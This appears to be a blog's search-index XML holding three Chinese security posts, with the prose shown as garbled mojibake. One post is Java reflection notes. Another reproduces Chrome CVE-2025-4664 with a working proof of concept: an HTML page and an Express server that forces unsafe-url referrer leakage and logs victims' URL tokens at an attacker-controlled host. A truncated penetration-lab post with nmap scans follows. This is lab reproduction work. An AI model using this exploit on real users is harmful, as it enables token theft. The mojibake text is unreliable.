<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Javaåå°„æœºåˆ¶è¯¦è§£</title>
      <link href="/2025/05/25/%20Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/"/>
      <url>/2025/05/25/%20Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="åå°„åŸºç¡€">åå°„åŸºç¡€</h2><p>ä¸ªäººè§‰å¾—pdaiå¤§ä½¬å†™çš„éå¸¸ä¸é”™ï¼Œæœ¬æ–‡ç« å†…å®¹åŸºæœ¬éƒ½æ¥è‡ªåŸæ–‡<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>ï¼Œå…¶ä¸­æœ‰äº›è‡ªå·±ç†è§£çš„éƒ¨åˆ†ï¼Œåšäº†äº›è®¸ä¿®æ”¹ã€‚</p><p><code>RTTI</code>ï¼ˆRun-Time Type Identificationï¼‰è¿è¡Œæ—¶ç±»å‹è¯†åˆ«ã€‚åœ¨ã€ŠThinking in Javaã€‹ä¸€ä¹¦ç¬¬åå››ç« ä¸­æœ‰æåˆ°ï¼Œå…¶ä½œç”¨æ˜¯åœ¨è¿è¡Œæ—¶è¯†åˆ«ä¸€ä¸ªå¯¹è±¡çš„ç±»å‹å’Œç±»çš„ä¿¡æ¯ã€‚ä¸»è¦æœ‰ä¸¤ç§æ–¹å¼ï¼šä¸€ç§æ˜¯&quot;ä¼ ç»Ÿçš„&quot;<code>RTTI</code>ï¼Œå®ƒå‡å®šæˆ‘ä»¬åœ¨ç¼–è¯‘æ—¶å·²ç»çŸ¥é“äº†æ‰€æœ‰çš„ç±»å‹ï¼›å¦ä¸€ç§æ˜¯â€œåå°„â€æœºåˆ¶ï¼Œ<strong>å®ƒå…è®¸æˆ‘ä»¬åœ¨è¿è¡Œæ—¶å‘ç°å’Œä½¿ç”¨ç±»çš„ä¿¡æ¯</strong>ã€‚</p><p>åå°„å°±æ˜¯æŠŠ<strong>Javaç±»ä¸­çš„å„ç§æˆåˆ†æ˜ å°„æˆä¸€ä¸ªä¸ªçš„Javaå¯¹è±¡</strong></p><p>ä¾‹å¦‚ï¼šä¸€ä¸ªç±»æœ‰ï¼šæˆå‘˜å˜é‡ã€æ–¹æ³•ã€æ„é€ æ–¹æ³•ã€åŒ…ç­‰ç­‰ä¿¡æ¯ï¼Œåˆ©ç”¨åå°„æŠ€æœ¯å¯ä»¥å¯¹ä¸€ä¸ªç±»è¿›è¡Œè§£å‰–ï¼ŒæŠŠä¸ªä¸ªç»„æˆéƒ¨åˆ†æ˜ å°„æˆä¸€ä¸ªä¸ªå¯¹è±¡ã€‚</p><blockquote><p>è¿™é‡Œæˆ‘ä»¬é¦–å…ˆéœ€è¦ç†è§£ Classç±»ï¼Œä»¥åŠç±»çš„åŠ è½½æœºåˆ¶ï¼› ç„¶ååŸºäºæ­¤æˆ‘ä»¬å¦‚ä½•é€šè¿‡åå°„è·å–Classç±»ä»¥åŠç±»ä¸­çš„æˆå‘˜å˜é‡ã€æ–¹æ³•ã€æ„é€ æ–¹æ³•ç­‰ã€‚</p></blockquote><h3 id="Classç±»">Classç±»</h3><p>Classç±»ï¼ŒClassç±»ä¹Ÿæ˜¯ä¸€ä¸ªå®å®åœ¨åœ¨çš„ç±»ï¼Œå­˜åœ¨äºJDKçš„java.langåŒ…ä¸­ã€‚Classç±»çš„å®ä¾‹è¡¨ç¤ºjavaåº”ç”¨è¿è¡Œæ—¶çš„ç±»(class ans enum)æˆ–æ¥å£(interface and annotation)ï¼ˆæ¯ä¸ªjavaç±»è¿è¡Œæ—¶éƒ½åœ¨JVMé‡Œè¡¨ç°ä¸ºä¸€ä¸ªclasså¯¹è±¡ï¼Œå¯é€šè¿‡ç±»å.classã€ç±»å‹.getClass()ã€Class.forName(â€œç±»åâ€)ç­‰æ–¹æ³•è·å–classå¯¹è±¡ï¼‰ã€‚æ•°ç»„åŒæ ·ä¹Ÿè¢«æ˜ å°„ä¸ºclass å¯¹è±¡çš„ä¸€ä¸ªç±»ï¼Œæ‰€æœ‰å…·æœ‰ç›¸åŒå…ƒç´ ç±»å‹å’Œç»´æ•°çš„æ•°ç»„éƒ½å…±äº«è¯¥ Class å¯¹è±¡ã€‚åŸºæœ¬ç±»å‹booleanï¼Œbyteï¼Œcharï¼Œshortï¼Œintï¼Œlongï¼Œfloatï¼Œdoubleå’Œå…³é”®å­—voidåŒæ ·è¡¨ç°ä¸º class å¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Class</span>&lt;T&gt; <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable,</span><br><span class="line">                              GenericDeclaration,</span><br><span class="line">                              Type,</span><br><span class="line">                              AnnotatedElement &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> ANNOTATION= <span class="number">0x00002000</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">ENUM</span>      <span class="operator">=</span> <span class="number">0x00004000</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SYNTHETIC</span> <span class="operator">=</span> <span class="number">0x00001000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">registerNatives</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        registerNatives();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Private constructor. Only the Java Virtual Machine creates Class objects.   //ç§æœ‰æ„é€ å™¨ï¼Œåªæœ‰JVMæ‰èƒ½è°ƒç”¨åˆ›å»ºClasså¯¹è±¡</span></span><br><span class="line"><span class="comment">     * This constructor is not used and prevents the default constructor being</span></span><br><span class="line"><span class="comment">     * generated.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Class</span><span class="params">(ClassLoader loader)</span> &#123;</span><br><span class="line">        <span class="comment">// Initialize final field for classLoader.  The initialization value of non-null</span></span><br><span class="line">        <span class="comment">// prevents future JIT optimizations from assuming this final field is null.</span></span><br><span class="line">        classLoader = loader;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åˆ°è¿™æˆ‘ä»¬ä¹Ÿå°±å¯ä»¥å¾—å‡ºä»¥ä¸‹å‡ ç‚¹ä¿¡æ¯ï¼š</p><ul><li>Classç±»ä¹Ÿæ˜¯ç±»çš„ä¸€ç§ï¼Œä¸classå…³é”®å­—æ˜¯ä¸ä¸€æ ·çš„ã€‚</li><li><strong>æ‰‹åŠ¨ç¼–å†™çš„ç±»è¢«ç¼–è¯‘åä¼šäº§ç”Ÿä¸€ä¸ªClasså¯¹è±¡ï¼Œå…¶è¡¨ç¤ºçš„æ˜¯åˆ›å»ºçš„ç±»çš„ç±»å‹ä¿¡æ¯ï¼Œè€Œä¸”è¿™ä¸ªClasså¯¹è±¡ä¿å­˜åœ¨åŒå.classçš„æ–‡ä»¶ä¸­(å­—èŠ‚ç æ–‡ä»¶)</strong></li><li>æ¯ä¸ªé€šè¿‡å…³é”®å­—classæ ‡è¯†çš„ç±»ï¼Œåœ¨å†…å­˜ä¸­æœ‰ä¸”åªæœ‰ä¸€ä¸ªä¸ä¹‹å¯¹åº”çš„Classå¯¹è±¡æ¥æè¿°å…¶ç±»å‹ä¿¡æ¯ï¼Œæ— è®ºåˆ›å»ºå¤šå°‘ä¸ªå®ä¾‹å¯¹è±¡ï¼Œå…¶ä¾æ®çš„éƒ½æ˜¯ç”¨ä¸€ä¸ªClasså¯¹è±¡ã€‚</li><li><strong>Classç±»åªå­˜ç§æœ‰æ„é€ å‡½æ•°ï¼Œå› æ­¤å¯¹åº”Classå¯¹è±¡åªèƒ½æœ‰JVMåˆ›å»ºå’ŒåŠ è½½</strong></li><li><strong>Classç±»çš„å¯¹è±¡ä½œç”¨æ˜¯è¿è¡Œæ—¶æä¾›æˆ–è·å¾—æŸä¸ªå¯¹è±¡çš„ç±»å‹ä¿¡æ¯</strong>ï¼Œè¿™ç‚¹å¯¹äºåå°„æŠ€æœ¯å¾ˆé‡è¦(å…³äºåå°„ç¨ååˆ†æ)ã€‚</li></ul><h3 id="ç±»åŠ è½½">ç±»åŠ è½½</h3><p>ç±»åŠ è½½æœºåˆ¶å’Œç±»å­—èŠ‚ç æŠ€æœ¯å¯ä»¥å‚è€ƒå¦‚ä¸‹ä¸¤ç¯‡æ–‡ç« ï¼š</p><ul><li><strong>JVMåŸºç¡€ - ç±»å­—èŠ‚ç è¯¦è§£</strong><sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup><ul><li>æºä»£ç é€šè¿‡ç¼–è¯‘å™¨ç¼–è¯‘ä¸ºå­—èŠ‚ç ï¼Œå†é€šè¿‡ç±»åŠ è½½å­ç³»ç»Ÿè¿›è¡ŒåŠ è½½åˆ°JVMä¸­è¿è¡Œ</li></ul></li><li><strong>JVMåŸºç¡€ - Java ç±»åŠ è½½æœºåˆ¶</strong><sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup><ul><li>è¿™ç¯‡æ–‡ç« å°†å¸¦ä½ æ·±å…¥ç†è§£Java ç±»åŠ è½½æœºåˆ¶</li></ul></li></ul><h2 id="åå°„çš„ä½¿ç”¨">åå°„çš„ä½¿ç”¨</h2><h2 id="åå°„æœºåˆ¶æ‰§è¡Œçš„æµç¨‹">åå°„æœºåˆ¶æ‰§è¡Œçš„æµç¨‹</h2><h2 id="å‚è€ƒ">å‚è€ƒ</h2><hr class="footnotes-sep"><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p><a href="https://pdai.tech/md/java/basic/java-basic-x-reflection.html#%E5%8F%8D%E5%B0%84%E5%9F%BA%E7%A1%80">https://pdai.tech/md/java/basic/java-basic-x-reflection.html#åå°„åŸºç¡€</a> <a href="#fnref1" class="footnote-backref">â†©ï¸</a></p></li><li id="fn2" class="footnote-item"><p><a href="https://pdai.tech/md/java/jvm/java-jvm-class.html">https://pdai.tech/md/java/jvm/java-jvm-class.html</a> <a href="#fnref2" class="footnote-backref">â†©ï¸</a></p></li><li id="fn3" class="footnote-item"><p><a href="https://pdai.tech/md/java/jvm/java-jvm-classload.html">https://pdai.tech/md/java/jvm/java-jvm-classload.html</a> <a href="#fnref3" class="footnote-backref">â†©ï¸</a></p></li></ol></section>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> åå°„æœºåˆ¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google Chrome è·¨æºæ•°æ®æ³„éœ²æ¼æ´(CVE-2025-4664)å¤ç°</title>
      <link href="/2025/05/15/Google-Chrome-%E8%B7%A8%E6%BA%90%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-CVE-2025-4664-%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/05/15/Google-Chrome-%E8%B7%A8%E6%BA%90%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-CVE-2025-4664-%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2><p>å‰å‡ å¤©æ‰å†™äº†ä¸€ç¯‡æ–‡ç« <sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>ï¼Œå…³äºæ•°æ®åŒ…ä¸­<code>referer</code>å¤´ä¿¡æ¯æ³„éœ²çš„é—®é¢˜ã€‚èƒ½çªƒå–<code>referer</code>å¤´ä¸­çš„æ•æ„Ÿä¿¡æ¯ã€‚çªƒå–å…³é”®æ˜¯è¦å¯ç”¨<code>unsafe-url</code>ï¼Œè¿™é‡Œå°±æ˜¯å‰ç«¯å¼€å‘çš„è®¾ç½®é—®é¢˜äº†ã€‚æœ€è¿‘çˆ†å‡ºäº†ä¸€ä¸ª<code>Chrome</code>æµè§ˆå™¨çš„æ¼æ´ï¼Œå°±æ˜¯å»çªƒå–ç”¨æˆ·<code>referer</code>å¤´ä¸­çš„æ•æ„Ÿä¿¡æ¯ï¼Œä¸éœ€è¦å‰ç«¯å¯ç”¨äº†<code>unsafe-url</code>ä¹Ÿå¯ä»¥å®ç°æ•æ„Ÿä¿¡æ¯çš„çªƒå–ã€‚æœ€åˆæˆ‘åœ¨Xä¸Šçœ‹åˆ°äº†æå‡ºè¿™ä¸ªé—®é¢˜çš„æ¨æ–‡<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>ï¼Œå½“æ—¶å¥½åƒæ˜¯è¯´ä¸ç®—æ˜¯æ¼æ´é—®é¢˜ï¼Œåé¢<code>Google</code>ç»™äº†<code>CVE</code>ï¼Œå®šçº§ä¸º<code>CVE-2025-4664</code>ã€‚ä¸‹é¢æˆ‘ä»¬æ¥å¤ç°ä¸€ä¸‹è¿™ä¸ªæ¼æ´ã€‚</p><h2 id="æ¼æ´æè¿°">æ¼æ´æè¿°</h2><p>Google å‘å¸ƒå…¬å‘Šç§°**Google Chrome è·¨æºæ•°æ®æ³„éœ²æ¼æ´(CVE-2025-4664)**å­˜åœ¨åœ¨é‡åˆ©ç”¨ï¼Œè¯¥æ¼æ´æºäº Google Chrome åŠ è½½ç¨‹åºä¸­çš„ç­–ç•¥æ‰§è¡Œä¸è¶³ï¼Œè¿œç¨‹æ”»å‡»è€…åˆ©ç”¨æ­¤æ¼æ´å¯ä½¿æµè§ˆå™¨å‘èµ·è¯·æ±‚æ—¶æºå¸¦å®Œæ•´çš„URLï¼Œå¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>ã€‚<strong>ç›®å‰è¯¥æ¼æ´å·²å‘ç°åœ¨é‡åˆ©ç”¨ã€‚</strong></p><p>é‰´äºæ­¤æ¼æ´å½±å“èŒƒå›´è¾ƒå¤§ï¼Œå»ºè®®å®¢æˆ·å°½å¿«åšå¥½è‡ªæŸ¥åŠé˜²æŠ¤ã€‚âš ï¸âš ï¸âš ï¸</p><h2 id="æ¼æ´å½±å“ç‰ˆæœ¬">æ¼æ´å½±å“ç‰ˆæœ¬</h2><blockquote><p>Google Chrome(Windows/Mac) &lt; 136.0.7103.113/.114</p><p>Google Chrome(Linux) &lt; 136.0.7103.113</p></blockquote><h2 id="æ¼æ´å¤ç°">æ¼æ´å¤ç°</h2><p>è¿˜æ˜¯æŒ‰ç…§ä¹‹å‰å†™çš„<sup class="footnote-ref"><a href="#fn1" id="fnref1:1">[1:1]</a></sup>ã€‚</p><ul><li><code>A</code>ä¸º<code>URL</code>ï¼š<code>http://127.0.0.1:3000/index.html?token=xxxxxx</code></li><li><code>B</code>ä¸ºè¿™ä¸ª<code>index.html</code>é¡µé¢ï¼Œå…¶ä¸­<code>img</code>æ ‡ç­¾çš„<code>src</code>å±æ€§æˆ‘ä»¬å¯æ§ï¼Œ<strong>å…¶é¡µé¢ä¸å¯ç”¨<code>unsafe-url</code></strong>ã€‚</li></ul><blockquote><p>æ”»å‡»æ•ˆæœï¼š å—å®³è€…ä¼šå¸¦ç€è‡ªå·±çš„<code>token</code>ï¼Œå°±æ˜¯è¿™é‡Œçš„<code>A</code>ï¼Œè®¿é—®åˆ°é¡µé¢<code>B</code>ï¼Œ<code>B</code>ä¸­çš„<code>img</code>æ ‡ç­¾çš„<code>src</code>å±æ€§æˆ‘ä»¬å¯æ§ï¼Œè®¾ç½®ä¸ºæ”»å‡»è€…ç›‘å¬æ•°æ®åŒ…çš„è„šæœ¬ï¼Œç›‘å¬çš„æ•°æ®åŒ…ä¸­åŒ…å«æœ‰æ•æ„Ÿä¿¡æ¯çš„<code>referer</code>ï¼Œè¿›è€Œå®ç°ä¿¡æ¯çš„çªƒå–ã€‚</p></blockquote><p><code>B</code>çš„<code>index.html</code>é¡µé¢å†…å®¹å¦‚ä¸‹ï¼Œå…¶ä¸­çš„<code>http://127.0.0.1:3001/image</code>ä¸ºæ”»å‡»è€…åµŒå…¥çš„ç›‘å¬æ•°æ®åŒ…çš„æ¶æ„<code>URL</code>ï¼Œè¿™é‡Œä¸ºäº†æ¼”ç¤ºæ–¹ä¾¿æˆ‘ä½¿ç”¨äº†æœ¬åœ°çš„<code>127.0.0.1:3001</code>è¡¨ç¤ºã€‚è¿™é‡Œé¡µé¢æ²¡å¯ç”¨<code>unsafe-url</code>ï¼Œæ­£å¸¸æ˜¯çªƒå–ä¸åˆ°<code>referer</code>å¤´ä¸­çš„æ•æ„Ÿä¿¡æ¯çš„ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Logo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Logo Picture<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:3001/image&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Logo Picture&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯¹äº<code>http://127.0.0.1:3001/image</code>çš„åç«¯ä»£ç <code>main.js</code>å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3001</span></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/image&#x27;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Link&#x27;</span>,<span class="string">&#x27;&lt;http://127.0.0.1:3001/log&gt;;rel=&quot;preload&quot;; as=&quot;image&quot;;referrerpolicy=&quot;unsafe-url&quot;&#x27;</span>)</span><br><span class="line">    res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname,<span class="string">&#x27;logo.png&#x27;</span>))</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/log&#x27;</span>,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">headers</span>[<span class="string">&#x27;referer&#x27;</span>]);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Hi!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port,<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server running at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>æœ¬åœ°ä½¿ç”¨<code>python3 -m http.server 3000</code>å¯ç”¨ä¸€ä¸ª<code>web</code>æœåŠ¡ï¼ŒæŠŠ<code>B</code>è¿™ä¸ª<code>index.html</code>é¡µé¢æ”¾åœ¨å½“å‰å¯ç”¨<code>web</code>æœåŠ¡çš„ç›®å½•ä¸‹ï¼Œå—å®³è€…è®¿é—®<code>A</code>ï¼Œå³<code>http://127.0.0.1:3000/index.html?token=secret</code>ï¼Œè¡¨ç¤ºå—å®³è€…æ­£å¸¸è®¿é—®é¡µé¢ï¼Œåˆ°è¾¾äº†<code>B</code>ã€‚</p><p>æ”»å‡»è€…åœ¨è‡ªå·±çš„<code>vps</code>ä¸Š<code>node main.js</code>è¿è¡Œæ¶æ„çš„è„šæœ¬ï¼Œå³å¾—åˆ°è¿™é‡Œçš„<code>http://127.0.0.1:3001/image</code>ã€‚å°†è¿™ä¸ªæ¶æ„çš„<code>URL</code>ï¼ŒåµŒå…¥åˆ°<code>B</code>è¿™ä¸ªæ­£å¸¸å®‰å…¨çš„é¡µé¢ä¸­å»ï¼Œå‰ææ˜¯<code>B</code>çš„<code>src</code>å±æ€§æ˜¯æ”»å‡»è€…å¯æ§çš„ã€‚</p><p>å—å®³è€…ä½¿ç”¨ä¸å®‰å…¨çš„<code>Google Chrome</code>æµè§ˆå™¨ç‰ˆæœ¬ï¼Œå»è®¿é—®å®‰å…¨<code>Referer-Policy</code>é…ç½®çš„ <code>B</code>é¡µé¢æ—¶ï¼Œå°±ä¼šå¯¼è‡´<code>referer</code>å¤´ä¸­çš„æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚</p><p><img src="/2025/05/15/Google-Chrome-%E8%B7%A8%E6%BA%90%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-CVE-2025-4664-%E5%A4%8D%E7%8E%B0/image-20250515214503409.png" alt="image-20250515214503409"></p><p>ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="/2025/05/15/Google-Chrome-%E8%B7%A8%E6%BA%90%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-CVE-2025-4664-%E5%A4%8D%E7%8E%B0/image-20250515223129119.png" alt="image-20250515223129119"></p><p><img src="/2025/05/15/Google-Chrome-%E8%B7%A8%E6%BA%90%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-CVE-2025-4664-%E5%A4%8D%E7%8E%B0/image-20250515223008246.png" alt="image-20250515223008246"></p><p><img src="/2025/05/15/Google-Chrome-%E8%B7%A8%E6%BA%90%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-CVE-2025-4664-%E5%A4%8D%E7%8E%B0/image-20250515214647072.png" alt="image-20250515214647072"></p><p>æˆ‘ä½¿ç”¨çš„<code>Chrome</code>ç‰ˆæœ¬å¦‚ä¸‹ï¼Œä½äºå®‰å…¨ç‰ˆæœ¬ã€‚</p><p><img src="/2025/05/15/Google-Chrome-%E8%B7%A8%E6%BA%90%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-CVE-2025-4664-%E5%A4%8D%E7%8E%B0/image-20250515214726592.png" alt="image-20250515214726592"></p><h2 id="å‚è€ƒ">å‚è€ƒ</h2><hr class="footnotes-sep"><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p><a href="https://x2nn.github.io/2025/05/06/%E6%95%B0%E6%8D%AE%E5%8C%85referer%E5%A4%B4%E4%B8%AD%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E7%AA%83%E5%8F%96/">https://x2nn.github.io/2025/05/06/æ•°æ®åŒ…refererå¤´ä¸­æ•æ„Ÿä¿¡æ¯çš„çªƒå–/</a> <a href="#fnref1" class="footnote-backref">â†©ï¸</a> <a href="#fnref1:1" class="footnote-backref">â†©ï¸</a></p></li><li id="fn2" class="footnote-item"><p><a href="https://x.com/slonser_/status/1919439373986107814">https://x.com/slonser_/status/1919439373986107814</a> <a href="#fnref2" class="footnote-backref">â†©ï¸</a></p></li><li id="fn3" class="footnote-item"><p><a href="https://mp.weixin.qq.com/s/Gz0PBUfFv4Cz7FUNDjYTcQ">https://mp.weixin.qq.com/s/Gz0PBUfFv4Cz7FUNDjYTcQ</a> <a href="#fnref3" class="footnote-backref">â†©ï¸</a></p></li></ol></section>]]></content>
      
      
      <categories>
          
          <category> Webæ¼æ´å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¿¡æ¯æ³„éœ² </tag>
            
            <tag> Referer-Policy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æš—æœˆé¡¹ç›®å…­å†…ç½‘åŸŸæ¸—é€ç¬”è®°</title>
      <link href="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒæ­å»º">ç¯å¢ƒæ­å»º</h2><p>é¶åœºç¯å¢ƒçš„æ‹“æ‰‘å›¾å¦‚ä¸‹ï¼š</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512124656889.png" alt="image-20250512124656889"></p><p>é¶åœºæ˜¯<code>webhack123</code>ï¼Œ<code>WEB</code>æœåŠ¡å™¨æœ‰ä¸¤å—ç½‘å¡ï¼Œ<code>DC</code>æ˜¯åŸŸæ§ã€‚</p><h2 id="ä¿¡æ¯æ”¶é›†">ä¿¡æ¯æ”¶é›†</h2><h3 id="ç«¯å£æ¢æµ‹">ç«¯å£æ¢æµ‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.1.13</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512125122545.png" alt="image-20250512125122545"></p><h3 id="nmapè·å–ç³»ç»Ÿå’Œç‰ˆæœ¬ä¿¡æ¯">nmapè·å–ç³»ç»Ÿå’Œç‰ˆæœ¬ä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80,135,139,445,3306,3389,47001,49152,49153,49154,49155,49156,49157 -A 192.168.1.13 -oA webhack</span><br></pre></td></tr></table></figure><p>ç”±æ‰«æçš„ä¿¡æ¯å¯çŸ¥ï¼Œ<code>web</code>æœåŠ¡å™¨ä½¿ç”¨çš„æ˜¯<code>phpstudy</code>ã€‚æ“ä½œç³»ç»Ÿä¸º<code>Windows Server 2008 R2</code></p><h2 id="å¯¹ç½‘ç«™è¿›è¡Œæµ‹è¯•">å¯¹ç½‘ç«™è¿›è¡Œæµ‹è¯•</h2><p>åœ¨<code>Mac</code>çš„<code>hosts</code>æ–‡ä»¶ä¸­æ·»åŠ <code>192.168.1.13 www.webhack123.com</code>å’Œ<code>192.168.1.13 admin.webhack123.com</code>ï¼Œè¿™æ ·æˆ‘çš„<code>Mac</code>é€šè¿‡åŸŸåå°±å¯è®¿é—®åˆ°å¯¹åº”çš„ç½‘ç«™ã€‚</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512124840963.png" alt="image-20250512124840963"></p><h3 